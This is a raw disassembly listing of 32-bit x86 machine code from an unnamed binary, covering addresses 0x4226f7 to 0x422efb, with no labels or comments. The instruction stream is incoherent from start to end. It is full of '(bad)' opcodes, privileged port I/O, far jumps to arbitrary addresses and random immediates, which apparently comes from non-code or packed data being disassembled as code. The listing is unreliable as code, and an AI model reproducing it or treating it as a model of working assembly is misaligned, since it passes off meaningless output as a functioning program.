  4226f7:	sbb    BYTE PTR [ebx-0x37770db8],cl
  4226fd:	jl     0x4226a5
  4226ff:	outs   dx,DWORD PTR ds:[esi]
  422700:	adc    DWORD PTR [edx],0x5fa99c3e
  422706:	mov    edi,0xed38d551
  42270b:	or     ch,ah
  42270d:	mov    ecx,0x2374e958
  422712:	or     DWORD PTR cs:[ecx-0x40dec68f],ebx
  422719:	in     eax,dx
  42271a:	cli    
  42271b:	test   al,0x98
  42271d:	push   ds
  42271e:	and    DWORD PTR [ebx-0x46d21b96],0x5405413e
  422728:	sbb    al,0xc3
  42272a:	mov    cs,WORD PTR [esi-0x27]
  42272d:	jb     0x4226ff
  42272f:	ja     0x42272a
  422731:	xchg   DWORD PTR [ebx-0x15],eax
  422734:	retf   
  422735:	cmp    DWORD PTR [ecx],edi
  422737:	adc    BYTE PTR [ecx-0x28],cl
  42273a:	pop    es
  42273b:	mov    ch,0x98
  42273d:	outs   dx,BYTE PTR ds:[esi]
  42273e:	arpl   WORD PTR ds:[ebx-0x79cc5ec0],dx
  422745:	jle    0x422704
  422747:	lea    ecx,[eax-0x2f]
  42274a:	pop    ecx
  42274b:	cmp    edx,DWORD PTR [edx]
  42274d:	test   BYTE PTR [edx-0x47],ch
  422750:	jnp    0x422776
  422752:	jge    0x422734
  422754:	ud1    eax,DWORD PTR [ebp-0x45]
  422758:	jecxz  0x42276c
  42275a:	es es or ecx,esi
  42275e:	mov    dh,0x2
  422760:	xor    BYTE PTR [eax],cl
  422762:	je     0x422751
  422764:	aad    0xff
  422766:	pop    ss
  422767:	aad    0x64
  422769:	mov    ebx,0x4e3ac2b5
  42276e:	dec    eax
  42276f:	cwde   
  422770:	sti    
  422771:	mov    ecx,0x10f38af3
  422776:	cmp    BYTE PTR [edx+0x3e2fe79],bh
  42277c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42277d:	xlat   BYTE PTR ds:[ebx]
  42277e:	lods   al,BYTE PTR ds:[esi]
  42277f:	repz jbe 0x4227a8
  422782:	xchg   edx,eax
  422783:	mov    ch,0x92
  422785:	cwde   
  422786:	dec    esp
  422787:	out    0x1e,eax
  422789:	mov    ebp,0xf53e72fa
  42278e:	and    BYTE PTR ds:0xb69459ee,ch
  422794:	jmp    0xd23f:0x6432e5cc
  42279b:	xor    eax,0x1f12ccbc
  4227a0:	and    al,0x3b
  4227a2:	cmp    DWORD PTR [esi-0x3981efdc],esp
  4227a8:	loop   0x422749
  4227aa:	into   
  4227ab:	fdiv   DWORD PTR [ebx+0x4942a4ad]
  4227b1:	int3   
  4227b2:	inc    edx
  4227b3:	fld    TBYTE PTR [eax]
  4227b5:	bound  ebx,QWORD PTR [edi+0x261cd71d]
  4227bb:	and    bl,cl
  4227bd:	xlat   BYTE PTR ds:[ebx]
  4227be:	(bad)  
  4227c0:	std    
  4227c1:	pop    edx
  4227c2:	out    0x53,eax
  4227c4:	jge    0x422795
  4227c6:	lock in al,0xaa
  4227c9:	fisttp QWORD PTR [ecx-0x58]
  4227cc:	mov    bh,0xe7
  4227ce:	mov    ds:0x53e38111,eax
  4227d3:	lods   eax,DWORD PTR ds:[esi]
  4227d4:	cmp    bh,bl
  4227d6:	mov    cl,0x96
  4227d8:	cmp    ebp,DWORD PTR [ebp-0x6b]
  4227db:	jnp    0x42277c
  4227dd:	pop    ss
  4227de:	or     bh,BYTE PTR [ebp+edi*8-0x6def6768]
  4227e5:	jl     0x42277c
  4227e7:	test   bl,dl
  4227e9:	mov    bh,0xce
  4227eb:	outs   dx,BYTE PTR ds:[esi]
  4227ec:	mov    ecx,0x5147889a
  4227f1:	shl    BYTE PTR [edx],1
  4227f3:	imul   edx,DWORD PTR [ecx+0x1f],0xffffffee
  4227f7:	sbb    bh,0xb3
  4227fa:	push   esi
  4227fb:	in     eax,0xc7
  4227fd:	and    esp,DWORD PTR [ebx*1+0x6c6d4cf0]
  422804:	adc    ebp,esi
  422806:	je     0x4227ab
  422808:	sub    ah,BYTE PTR [esi+0x68]
  42280b:	adc    al,0xa3
  42280d:	popa   
  42280e:	ins    DWORD PTR es:[edi],dx
  42280f:	jecxz  0x42288f
  422811:	cmp    ebp,DWORD PTR [eax-0x475991a2]
  422817:	stos   BYTE PTR es:[edi],al
  422818:	into   
  422819:	(bad)  
  42281a:	jmp    0xb85f2286
  42281f:	mov    esi,0xcbdc577d
  422824:	fbstp  TBYTE PTR [ecx-0x1e790deb]
  42282a:	mov    BYTE PTR [ebx],0xea
  42282d:	pop    ebp
  42282e:	stc    
  42282f:	pop    edi
  422830:	jmp    0x26e5df8c
  422835:	mov    ah,0x92
  422837:	imul   ecx,DWORD PTR [ebx-0x117c576d],0x63
  42283e:	push   edi
  42283f:	add    DWORD PTR [edi-0x30d9b362],ecx
  422845:	mov    ah,0x69
  422847:	repz mov esi,0x2daeb6a6
  42284d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42284e:	sub    ch,BYTE PTR ds:0xe947f4c0
  422854:	ror    BYTE PTR [ecx+0x4d],cl
  422857:	mov    bl,0xa9
  422859:	mov    ebx,0x14b981fb
  42285e:	fs enter 0x34ee,0x6b
  422863:	ins    BYTE PTR es:[edi],dx
  422864:	pop    DWORD PTR [edx-0x1d]
  422867:	repz add al,0xd6
  42286a:	test   al,0xa2
  42286c:	sub    esi,esp
  42286e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42286f:	aad    0xf
  422871:	int    0x99
  422873:	adc    bl,BYTE PTR [ebp-0x19]
  422876:	loope  0x4228f2
  422878:	ret    
  422879:	xor    ch,ch
  42287b:	fucomip st,st(5)
  42287d:	xchg   esi,eax
  42287e:	xchg   edi,eax
  42287f:	setno  dh
  422882:	push   edx
  422883:	scas   al,BYTE PTR es:[edi]
  422884:	mov    esp,0xf7b2cf20
  422889:	div    DWORD PTR [ebx+0x513976bf]
  42288f:	pop    ds
  422890:	stos   DWORD PTR es:[edi],eax
  422891:	push   esp
  422892:	push   0x7d
  422894:	mov    ch,0x6a
  422896:	sub    eax,0x4d
  422899:	imul   esp,DWORD PTR [edx-0x4b],0xf47bdbc2
  4228a0:	jge    0x422877
  4228a2:	loop   0x422910
  4228a4:	mov    al,0x30
  4228a6:	mov    cl,0x57
  4228a8:	inc    ecx
  4228a9:	xchg   edx,eax
  4228aa:	repnz outs dx,BYTE PTR ds:[esi]
  4228ac:	mov    dl,0x5a
  4228ae:	repnz adc BYTE PTR [edi],cl
  4228b1:	push   esp
  4228b2:	enter  0x3546,0x70
  4228b6:	jl     0x422909
  4228b8:	int    0xb9
  4228ba:	mov    BYTE PTR [edi],dh
  4228bc:	adc    al,0x6f
  4228be:	bound  esi,QWORD PTR [eax]
  4228c0:	stos   DWORD PTR es:[edi],eax
  4228c1:	jne    0x422889
  4228c3:	sbb    DWORD PTR [eax+0x54],0x75a6ef91
  4228ca:	popf   
  4228cb:	call   0x6d09a449
  4228d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228d1:	gs mov bh,bl
  4228d4:	stos   BYTE PTR es:[edi],al
  4228d5:	rcl    DWORD PTR [ebp-0x5d683281],0xf9
  4228dc:	adc    al,0xfd
  4228de:	js     0x42291d
  4228e0:	popf   
  4228e1:	jb     0x4228f2
  4228e3:	and    BYTE PTR [ecx+0x55],bl
  4228e6:	jne    0x4228fc
  4228e8:	mov    ah,0xfc
  4228ea:	mov    al,ds:0xe0247aa1
  4228ef:	aam    0x8c
  4228f1:	rcl    BYTE PTR [edi],0x69
  4228f4:	out    dx,eax
  4228f5:	xchg   ecx,eax
  4228f6:	and    bh,cl
  4228f8:	push   esi
  4228f9:	and    esi,ecx
  4228fb:	test   al,0x2b
  4228fd:	xchg   ebp,eax
  4228fe:	and    esi,edi
  422900:	jno    0x422941
  422902:	or     dl,BYTE PTR [ecx+eiz*4+0x2665b3d0]
  422909:	inc    eax
  42290a:	pop    esp
  42290b:	sub    eax,DWORD PTR [ebp-0x18b2daf6]
  422911:	xchg   esp,eax
  422912:	push   ebp
  422913:	retf   0x296f
  422916:	aaa    
  422917:	int    0x3e
  422919:	fbstp  TBYTE PTR [eax+0x1e17ce37]
  42291f:	cmp    ah,BYTE PTR [esi+0xc]
  422922:	aas    
  422923:	aad    0xa1
  422925:	sbb    DWORD PTR [esi],0xffffff9a
  422928:	add    eax,0x21a2d5df
  42292d:	out    0x58,al
  42292f:	clc    
  422930:	imul   ebx,DWORD PTR [eax+eax*1+0x17],0xffffffa9
  422935:	pop    esp
  422936:	aaa    
  422937:	push   es
  422938:	jge    0x4229ab
  42293a:	bound  esi,QWORD PTR [ecx-0x7f]
  42293d:	es adc bh,dh
  422940:	xor    DWORD PTR [eax-0x2a],ebx
  422943:	mov    esp,0xc448d536
  422948:	add    BYTE PTR [eax],al
  42294a:	dec    eax
  42294b:	push   eax
  42294c:	push   eax
  42294d:	dec    ebp
  42294e:	pop    eax
  42294f:	dec    ebp
  422950:	pop    ebp
  422951:	push   ebp
  422952:	stos   DWORD PTR es:[edi],eax
  422953:	mov    ch,0xf6
  422955:	stc    
  422956:	out    dx,al
  422957:	ret    0x227d
  42295a:	push   es
  42295b:	mov    eax,0x6860001
  422960:	add    BYTE PTR [eax],al
  422962:	push   edx
  422963:	push   edi
  422964:	enter  0xdd84,0xb9
  422968:	pushaw 
  42296a:	leave  
  42296b:	ds pop edx
  42296d:	ret    
  42296e:	or     dh,BYTE PTR [eax]
  422970:	les    eax,FWORD PTR [edx]
  422972:	test   al,0x23
  422974:	sbb    dl,BYTE PTR [ecx-0x5e]
  422977:	adc    eax,0xdda70728
  42297c:	in     al,0x39
  42297e:	pop    esi
  42297f:	dec    ebp
  422980:	xchg   ebp,eax
  422981:	jecxz  0x422947
  422983:	test   al,0x50
  422985:	pop    eax
  422986:	test   DWORD PTR [edx+0x69618858],ebx
  42298c:	sbb    eax,0x304e149b
  422991:	mov    dh,0xbf
  422993:	inc    eax
  422994:	fcmovnb st,st(7)
  422996:	sub    eax,0x39b5199b
  42299b:	push   ebx
  42299c:	jmp    0x422988
  42299e:	(bad)
  4229a1:	cmp    BYTE PTR [ebx-0x11],cl
  4229a4:	push   eax
  4229a5:	mov    ch,0x5
  4229a7:	int3   
  4229a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229a9:	fadd   QWORD PTR [ecx]
  4229ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229ac:	dec    ecx
  4229ad:	scas   al,BYTE PTR es:[edi]
  4229ae:	adc    eax,0xc473421b
  4229b3:	add    DWORD PTR [edi-0x1d3d892f],edx
  4229b9:	add    DWORD PTR [ebx+0x6e782ef],0x66a609fa
  4229c3:	adc    al,0xad
  4229c5:	mov    eax,0xca7f51e1
  4229ca:	add    eax,0x503c56af
  4229cf:	mov    ds,WORD PTR [ebx]
  4229d1:	mov    esi,0xf0c5ed97
  4229d6:	ds dec eax
  4229d8:	xor    eax,0x598e6fdf
  4229dd:	arpl   sp,cx
  4229df:	das    
  4229e0:	jge    0x4229e6
  4229e2:	scas   al,BYTE PTR es:[edi]
  4229e3:	aad    0x2e
  4229e5:	mov    ebx,0x6a3f7d73
  4229ea:	sbb    ebx,esp
  4229ec:	adc    eax,0x1c3b855f
  4229f1:	mov    ah,0x85
  4229f3:	popa   
  4229f4:	mov    esp,0xd7ed844a
  4229f9:	sbb    eax,0x4710cdcf
  4229fe:	ficomp DWORD PTR [ebp-0x6184d534]
  422a04:	push   0x67536872
  422a09:	bound  ecx,QWORD PTR [ebx+esi*1-0x484972c1]
  422a10:	fld    QWORD PTR [eax+0x1f2926fc]
  422a16:	adc    al,0xd4
  422a18:	std    
  422a19:	lahf   
  422a1a:	(bad)  
  422a1b:	and    ebp,esp
  422a1d:	out    dx,eax
  422a1e:	mov    eax,ss:0xb2dadc40
  422a24:	jno    0x4229bf
  422a26:	cld    
  422a27:	adc    DWORD PTR [edx-0x844680d],0x4b
  422a2e:	xor    dl,BYTE PTR [edi]
  422a30:	test   BYTE PTR [edi+0x6b],ch
  422a33:	pop    edi
  422a35:	(bad)  [edi-0x292c7ea0]
  422a3b:	or     eax,0xaaa0de54
  422a40:	inc    ebx
  422a41:	sahf   
  422a42:	mov    ebx,0xcebea74f
  422a47:	fisubr DWORD PTR [esi+0x2a21afb9]
  422a4d:	mov    dl,0xf6
  422a4f:	inc    eax
  422a50:	cmp    BYTE PTR [ecx+0x67],cl
  422a53:	stos   BYTE PTR es:[edi],al
  422a54:	out    0x6a,al
  422a56:	pop    esp
  422a57:	imul   BYTE PTR ds:0x52aefd11
  422a5d:	add    bh,bh
  422a5f:	aas    
  422a60:	repz add esi,DWORD PTR [ebx+0x7d]
  422a64:	stc    
  422a65:	dec    eax
  422a66:	and    eax,DWORD PTR [ebx+0xb]
  422a69:	mov    edi,0x71bfcc25
  422a6e:	or     ecx,DWORD PTR [bp+si-0x3d]
  422a72:	das    
  422a73:	es pop ebx
  422a75:	pop    es
  422a76:	aaa    
  422a77:	xchg   DWORD PTR [ebx+0x94cdc1c],eax
  422a7d:	ror    DWORD PTR [ebp-0x6c],cl
  422a80:	stos   DWORD PTR es:[edi],eax
  422a81:	dec    ebx
  422a82:	mov    ebx,0x34f05411
  422a87:	xor    BYTE PTR [edi-0x14],bl
  422a8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a8b:	inc    eax
  422a8c:	mov    eax,0x50c3905
  422a91:	and    BYTE PTR [eax],0xf9
  422a94:	push   ebp
  422a95:	sbb    BYTE PTR [ebp-0x5],0xe
  422a99:	(bad)  
  422a9d:	mov    al,ds:0x960ed70
  422aa2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  422aa4:	xchg   esi,ecx
  422aa6:	xchg   ecx,eax
  422aa7:	or     DWORD PTR [ebx+0x386a257a],eax
  422aad:	(bad)  
  422aae:	fld    st(4)
  422ab0:	mov    ds:0x652ca1e4,al
  422ab5:	dec    edx
  422ab6:	gs (bad) 
  422ab8:	imul   ecx,DWORD PTR [ecx+edx*8],0x29
  422abc:	neg    BYTE PTR [eax+0x77fcd956]
  422ac2:	pop    esi
  422ac3:	ret    
  422ac4:	push   ebx
  422ac5:	lods   al,BYTE PTR ds:[esi]
  422ac6:	jg     0x422acd
  422ac8:	mov    edi,DWORD PTR [edi-0x534c6b15]
  422ace:	lahf   
  422acf:	stos   BYTE PTR es:[edi],al
  422ad0:	pop    edi
  422ad1:	mov    al,ds:0x7fdd6b42
  422ad6:	adc    DWORD PTR [esi+0x6b553fdc],esp
  422adc:	pop    edx
  422add:	jbe    0x422b29
  422adf:	xor    bh,dh
  422ae1:	xor    al,0xde
  422ae3:	jge    0x422ad1
  422ae5:	cmc    
  422ae6:	and    BYTE PTR [edi],ch
  422ae8:	(bad)  
  422aea:	div    BYTE PTR [ebp-0x78ba303f]
  422af0:	cmp    al,0xf3
  422af2:	cmp    dh,BYTE PTR [edx-0x7d8aa30e]
  422af8:	mov    dh,0xf0
  422afa:	xchg   edx,eax
  422afb:	(bad)  
  422afc:	mov    ebp,0xd5704dab
  422b01:	ror    DWORD PTR [ecx+ebx*2],cl
  422b04:	add    al,0xd1
  422b06:	jb     0x422a90
  422b08:	or     al,0xfe
  422b0a:	push   cs
  422b0b:	ja     0x422b2f
  422b0d:	inc    esp
  422b0e:	or     eax,0xcc967439
  422b13:	pusha  
  422b14:	fneni(8087 only) 
  422b16:	jbe    0x422aa1
  422b18:	add    eax,0x9e81cf51
  422b1d:	xor    edi,DWORD PTR ds:0x8593123d
  422b23:	mov    ds:0x7b95dea3,al
  422b28:	mov    ch,0xe1
  422b2a:	xor    BYTE PTR [eax+0x7d01ed84],bh
  422b30:	gs stc 
  422b32:	push   cs
  422b33:	stc    
  422b34:	call   DWORD PTR [edx]
  422b36:	or     BYTE PTR [ebp+0x7de1edeb],ah
  422b3c:	jns    0x422b8d
  422b3e:	sbb    DWORD PTR [esi],ebp
  422b40:	mov    ch,0xea
  422b42:	add    dl,BYTE PTR [ebp-0x414d43f]
  422b48:	fsub   DWORD PTR [ecx-0x6d]
  422b4b:	push   edi
  422b4c:	outs   dx,DWORD PTR ds:[esi]
  422b4d:	pop    ebp
  422b4e:	xor    BYTE PTR [edx+eiz*8+0x6],ah
  422b52:	inc    edx
  422b53:	call   0xf4a295b9
  422b58:	nop
  422b59:	div    cl
  422b5b:	dec    eax
  422b5c:	and    BYTE PTR [esp+ebx*8+0x77312cfb],dh
  422b63:	rol    DWORD PTR [edx],cl
  422b65:	(bad)  
  422b66:	sub    BYTE PTR [edi],bh
  422b68:	cmp    BYTE PTR [eax],ch
  422b6a:	mov    esi,0x23589c13
  422b6f:	(bad)  
  422b70:	popa   
  422b71:	mov    edi,0x3d0bdc44
  422b76:	fiadd  WORD PTR [ebx-0x376c6145]
  422b7c:	mov    ch,0xc5
  422b7e:	pop    esp
  422b7f:	mov    edi,0xace9fc22
  422b84:	test   BYTE PTR fs:[esi],al
  422b87:	cli    
  422b88:	xchg   esp,eax
  422b89:	int3   
  422b8a:	ds dec edi
  422b8c:	jne    0x422b49
  422b8e:	xchg   BYTE PTR [eax+0x40],dl
  422b91:	fadd   DWORD PTR [ebx+0x18]
  422b94:	xor    BYTE PTR [ebp+0x7cdfe3b0],0x16
  422b9b:	loopne 0x422c0b
  422b9d:	mov    ds,edx
  422b9f:	and    DWORD PTR [edi],ebx
  422ba1:	xchg   ebx,eax
  422ba2:	adc    ebp,0x46
  422ba5:	call   0x9e60:0x8c3fb81a
  422bac:	pop    DWORD PTR [ecx+0xe4e321e]
  422bb2:	adc    eax,0x91056b42
  422bb7:	(bad)  
  422bb8:	jmp    0x422c1e
  422bba:	std    
  422bbb:	ror    DWORD PTR [ebx+0x36],1
  422bbe:	fadd   st,st(6)
  422bc0:	sub    DWORD PTR [edi-0x5f],ebp
  422bc3:	cwde   
  422bc4:	pop    ss
  422bc5:	je     0x422c36
  422bc7:	enter  0xe4ed,0x6
  422bcb:	(bad)  
  422bcc:	cmp    eax,0x29d4e83a
  422bd1:	dec    edi
  422bd2:	jae    0x422b6d
  422bd4:	or     eax,0x4aefcbbc
  422bd9:	retf   
  422bda:	leave  
  422bdb:	int3   
  422bdc:	sbb    BYTE PTR ds:0xb65f155,dl
  422be2:	sahf   
  422be3:	not    BYTE PTR ds:0x13579bb
  422be9:	sbb    ch,BYTE PTR [ebx+esi*1]
  422bec:	push   ds
  422bed:	pop    ss
  422bee:	mov    DWORD PTR cs:[edi+0x291b9440],eax
  422bf5:	or     al,0x39
  422bf7:	shr    BYTE PTR [esp+ecx*1-0x491ba61a],0x6d
  422bff:	mov    ah,0x77
  422c01:	retf   
  422c02:	mov    eax,0x8166ce5a
  422c07:	push   ds
  422c08:	pop    ebx
  422c09:	adc    al,0xfa
  422c0b:	sbb    eax,0x3290385a
  422c10:	outs   dx,BYTE PTR ds:[esi]
  422c11:	ret    0x7bf1
  422c14:	shl    DWORD PTR [ebp+0x55dd0eac],0x95
  422c1b:	or     eax,DWORD PTR [esi-0x21]
  422c1e:	imul   edi,ebx,0xffffffa3
  422c21:	mov    ebx,0x53bd2049
  422c26:	das    
  422c27:	les    edi,FWORD PTR [eax-0x6682febc]
  422c2d:	sbb    eax,0xdf9d872a
  422c32:	fadd   DWORD PTR [edi]
  422c34:	sub    ebp,ecx
  422c36:	inc    eax
  422c37:	lods   eax,DWORD PTR ds:[esi]
  422c38:	popf   
  422c39:	dec    ecx
  422c3a:	inc    edi
  422c3b:	inc    edi
  422c3c:	sbb    eax,0x1d1f3d0c
  422c41:	inc    ebx
  422c42:	jp     0x422c04
  422c44:	pop    eax
  422c45:	inc    esi
  422c46:	xchg   edi,eax
  422c47:	test   DWORD PTR [eax-0x5a543cc9],ebp
  422c4d:	cmp    BYTE PTR gs:[esi+0x37],0xe2
  422c52:	add    DWORD PTR [ebx-0x6a7eb985],esi
  422c58:	push   edx
  422c59:	push   0x4b
  422c5b:	out    dx,al
  422c5c:	cmp    eax,0x3906236a
  422c61:	mov    esi,0x5f78f193
  422c66:	lahf   
  422c67:	adc    eax,0x51605a33
  422c6c:	pop    ecx
  422c6d:	imul   esi,ebp,0xa9b7acb6
  422c73:	mov    ch,0x27
  422c75:	fs retf 
  422c77:	inc    esi
  422c78:	sbb    bl,BYTE PTR [esi-0x75e31edc]
  422c7e:	xchg   ebx,eax
  422c7f:	test   DWORD PTR [eax-0xc],ecx
  422c82:	sbb    eax,0x51455f03
  422c87:	mov    ecx,0x7baed28a
  422c8c:	xor    eax,0xf07de419
  422c91:	mov    BYTE PTR [edi-0x2ce6afc2],cl
  422c97:	mov    esp,0x3d6720bb
  422c9c:	int    0xbd
  422c9e:	lahf   
  422c9f:	mov    dh,0x17
  422ca1:	xchg   esi,eax
  422ca2:	mov    ebx,0x4e116577
  422ca7:	xchg   ecx,eax
  422ca8:	xor    eax,0xd4f4f241
  422cad:	mov    ah,0xd3
  422caf:	sahf   
  422cb0:	pop    esp
  422cb1:	sub    DWORD PTR [edx+0x2dc477da],eax
  422cb7:	das    
  422cb8:	mov    eax,ebp
  422cba:	sub    esi,DWORD PTR [ebx-0x34bc6c94]
  422cc0:	inc    ecx
  422cc1:	add    DWORD PTR [ecx+esi*4-0x39],ecx
  422cc5:	ds xchg edx,eax
  422cc7:	dec    ebp
  422cc8:	mov    DWORD PTR [edx-0x5e6316bd],ecx
  422cce:	iret   
  422ccf:	adc    DWORD PTR ds:0xeb239aae,ecx
  422cd5:	sahf   
  422cd6:	pop    ebx
  422cd7:	push   eax
  422cd8:	test   eax,0xe5a4baf0
  422cdd:	(bad)  
  422cde:	mov    ds:0x819d628,eax
  422ce3:	jb     0x422d64
  422ce5:	add    eax,0x782d7e46
  422cea:	pop    ds
  422ceb:	dec    edx
  422cec:	cdq    
  422ced:	or     al,0xb4
  422cef:	cmp    bh,bh
  422cf1:	(bad)  
  422cf2:	fidivr WORD PTR [esi+0x41]
  422cf5:	jmp    0x23519d5c
  422cfa:	and    cl,bl
  422cfc:	rol    DWORD PTR [ecx-0x17],0x66
  422d00:	scas   eax,DWORD PTR es:[edi]
  422d01:	or     al,0x44
  422d03:	sub    cl,bh
  422d05:	xchg   cl,ah
  422d07:	out    dx,eax
  422d08:	inc    edi
  422d09:	dec    ebx
  422d0a:	stc    
  422d0b:	cmp    ah,BYTE PTR [esi-0x7472afe2]
  422d11:	adc    BYTE PTR ds:0xf490fda,ah
  422d17:	cmp    DWORD PTR [ecx],ebx
  422d19:	cmc    
  422d1a:	call   0x4bbf6e27
  422d1f:	sbb    dl,BYTE PTR [edi-0x5e784dab]
  422d25:	int    0xfc
  422d27:	rcr    BYTE PTR [ecx+0x20],0xe
  422d2b:	daa    
  422d2c:	pop    ecx
  422d2d:	ret    
  422d2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d30:	test   eax,0x3f0567f3
  422d35:	stos   DWORD PTR es:[edi],eax
  422d36:	add    al,ch
  422d38:	dec    edi
  422d39:	jne    0x422d35
  422d3b:	mov    al,0xcc
  422d3d:	add    BYTE PTR [esi-0x6146cd00],bl
  422d43:	and    BYTE PTR [ebp-0x6b57f2da],bl
  422d49:	cld    
  422d4a:	rcl    DWORD PTR [eax-0x699907f0],cl
  422d50:	nop
  422d51:	or     BYTE PTR [ecx-0x4],bh
  422d54:	fs scas eax,DWORD PTR es:[edi]
  422d56:	(bad)
  422d59:	shl    dh,cl
  422d5b:	nop
  422d5c:	sbb    ebp,ecx
  422d5e:	iret   
  422d5f:	test   BYTE PTR [ebx-0x41],dh
  422d62:	div    BYTE PTR [edi-0x39]
  422d65:	ret    
  422d66:	adc    eax,0x99c722df
  422d6b:	dec    edx
  422d6c:	leave  
  422d6d:	pop    ebp
  422d6e:	add    ecx,edi
  422d70:	and    ch,dl
  422d72:	mov    al,ds:0xeef38334
  422d77:	push   ebx
  422d78:	xor    BYTE PTR [edx+edx*8],0x53
  422d7c:	mov    ebx,0x88ae4626
  422d81:	push   ss
  422d82:	lea    esi,[eax+esi*2-0x4ba4af79]
  422d89:	and    eax,0xc455669
  422d8e:	stos   BYTE PTR es:[edi],al
  422d8f:	and    eax,0x79c73013
  422d94:	xchg   esi,eax
  422d95:	fbstp  TBYTE PTR [esi+0x9]
  422d98:	push   ss
  422d99:	mov    DWORD PTR [edx+ecx*2],edi
  422d9c:	push   cs
  422d9d:	cmc    
  422d9e:	sub    esp,eax
  422da0:	shl    DWORD PTR [esi-0x325a615],1
  422da6:	mov    BYTE PTR [ebx+0x2adedd3f],0x7b
  422dad:	lods   eax,DWORD PTR ds:[esi]
  422dae:	imul   esi,DWORD PTR [edx],0x8cc83763
  422db4:	cmp    dl,dl
  422db6:	mov    ds:0xc05e989d,eax
  422dbb:	cmp    DWORD PTR [eax+eax*1-0x5],0x19
  422dc0:	jecxz  0x422d47
  422dc2:	mov    dl,0x88
  422dc4:	and    al,0x24
  422dc6:	xchg   esp,eax
  422dc7:	jb     0x422da3
  422dc9:	jmp    0x5c2e:0x2b65f647
  422dd0:	vpmulhuw xmm6,xmm4,XMMWORD PTR [esi]
  422dd4:	adc    DWORD PTR [ecx+0x68188e36],edx
  422dda:	jmp    0xe0940b4f
  422ddf:	and    edi,edi
  422de1:	dec    edi
  422de2:	leave  
  422de3:	cld    
  422de4:	dec    esp
  422de5:	ror    edi,1
  422de7:	lahf   
  422de8:	add    cl,cl
  422dea:	sub    DWORD PTR [esi+0x7e2ee13d],esp
  422df0:	stos   BYTE PTR es:[edi],al
  422df1:	leave  
  422df2:	enter  0x24d0,0xa6
  422df6:	jge    0x422e02
  422df8:	fs enter 0x670e,0x70
  422dfd:	lahf   
  422dfe:	scas   al,BYTE PTR es:[edi]
  422dff:	cmp    ebp,DWORD PTR [eax]
  422e01:	clc    
  422e02:	test   al,0x4d
  422e04:	sbb    BYTE PTR [eax],cl
  422e06:	call   0xebb761a3
  422e0b:	popa   
  422e0c:	adc    BYTE PTR [edi-0x13e632a6],ah
  422e12:	mov    dl,0x96
  422e14:	or     BYTE PTR [ebp-0x247a5d5a],dh
  422e1a:	dec    edx
  422e1b:	mov    edi,0x6e9af051
  422e20:	popf   
  422e21:	retf   0xfc65
  422e24:	inc    ebp
  422e25:	les    ecx,FWORD PTR [esi-0x35c71ce1]
  422e2b:	ret    
  422e2c:	call   0x7cdc:0x86c33e55
  422e33:	ja     0x422e34
  422e35:	popa   
  422e36:	jmp    0x422e7d
  422e38:	pop    esp
  422e39:	xlat   BYTE PTR ds:[ebx]
  422e3a:	scas   al,BYTE PTR es:[edi]
  422e3b:	mov    ecx,DWORD PTR [ebp+0x58]
  422e3e:	out    dx,eax
  422e3f:	pusha  
  422e40:	sub    edx,ebx
  422e42:	not    BYTE PTR [eax]
  422e44:	sbb    al,0xb3
  422e46:	mov    eax,0xe5da6da3
  422e4b:	int    0xeb
  422e4d:	mov    al,0xef
  422e4f:	dec    eax
  422e50:	in     al,0x49
  422e52:	push   0xfffffff3
  422e54:	jecxz  0x422ded
  422e56:	mov    DWORD PTR ds:0x37c2c1e4,esp
  422e5c:	jbe    0x422df4
  422e5e:	or     cl,BYTE PTR [ecx]
  422e60:	data16 sahf 
  422e62:	xchg   esi,eax
  422e63:	scas   eax,DWORD PTR es:[edi]
  422e64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e65:	test   dh,0xc5
  422e68:	add    eax,0xf4c8077
  422e6d:	xchg   esi,eax
  422e6e:	xor    BYTE PTR [ebx-0x5b87bd35],ah
  422e74:	xchg   edi,eax
  422e75:	cwde   
  422e76:	xor    bl,BYTE PTR [eax]
  422e78:	mov    esi,0x92c72b67
  422e7d:	mov    ebx,0x820255e0
  422e82:	fild   QWORD PTR [ecx]
  422e84:	inc    esp
  422e85:	jp     0x422e5c
  422e87:	add    ebx,ebp
  422e89:	adc    DWORD PTR [esi-0x4a],0x9729c7ba
  422e90:	pop    eax
  422e91:	aam    0x90
  422e93:	jno    0x422e34
  422e95:	loopne 0x422e78
  422e97:	xchg   ebx,eax
  422e98:	daa    
  422e99:	add    eax,ebp
  422e9b:	mov    esp,0x6b8737e
  422ea0:	lods   al,BYTE PTR ds:[esi]
  422ea1:	out    0xc,al
  422ea3:	loopne 0x422ee4
  422ea5:	inc    edx
  422ea6:	push   ss
  422ea7:	sub    eax,0x377f3180
  422eac:	sbb    DWORD PTR [edx-0x56],edx
  422eaf:	dec    esi
  422eb0:	rol    DWORD PTR [edi+0x78],cl
  422eb3:	stc    
  422eb4:	adc    BYTE PTR [esi-0x4d40de8c],bl
  422eba:	mov    al,0xee
  422ebc:	dec    esi
  422ebd:	lock cld 
  422ebf:	call   0xad418ae0
  422ec4:	jmp    0x2871:0x82201900
  422ecb:	inc    esp
  422ecc:	push   ds
  422ecd:	into   
  422ece:	pop    ebx
  422ecf:	cmp    bh,dl
  422ed1:	fcom   DWORD PTR [edi+0x72]
  422ed4:	dec    eax
  422ed5:	cli    
  422ed6:	and    esp,edi
  422ed8:	es stc 
  422eda:	push   ebx
  422edb:	fistp  QWORD PTR [edx-0x56]
  422ede:	ret    
  422edf:	pop    edx
  422ee0:	cdq    
  422ee1:	es or  BYTE PTR cs:[edx],bl
  422ee5:	aas    
  422ee6:	xchg   bl,ah
  422ee8:	stos   DWORD PTR es:[edi],eax
  422ee9:	cmp    BYTE PTR [esi+0x7d],ch
  422eec:	mov    al,ds:0xabd91b4
  422ef1:	add    cl,dl
  422ef3:	in     eax,dx
  422ef4:	or     bh,bl
  422ef6:	mov    WORD PTR [ebp-0x1e],cs
  422ef9:	lock ins DWORD PTR es:[edi],dx
  422efb:	add    ecx,DWORD PTR [edi+0x7bab2b2b]
